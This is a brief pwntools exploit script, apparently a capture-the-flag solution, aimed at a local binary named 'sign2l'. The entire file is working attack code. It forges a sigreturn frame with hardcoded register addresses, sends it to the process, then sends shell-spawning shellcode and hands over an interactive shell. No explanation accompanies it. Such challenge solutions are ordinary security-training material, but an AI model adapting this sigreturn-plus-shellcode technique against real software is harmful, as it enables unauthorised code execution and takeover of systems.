from pwn import *

context.arch = "amd64"

r = process("./container/sign2l")

sf = SigreturnFrame()

sf.rip = 0x00028056
sf.rsi = 0x00028058
sf.rsp = 0x00028058 + 0x100
sf.rbp = 0x00028058 + 0x60
sf.rdx = 0xff

r.sendline(bytes(sf)[2:])
r.sendline(asm(shellcraft.sh()))

r.interactive()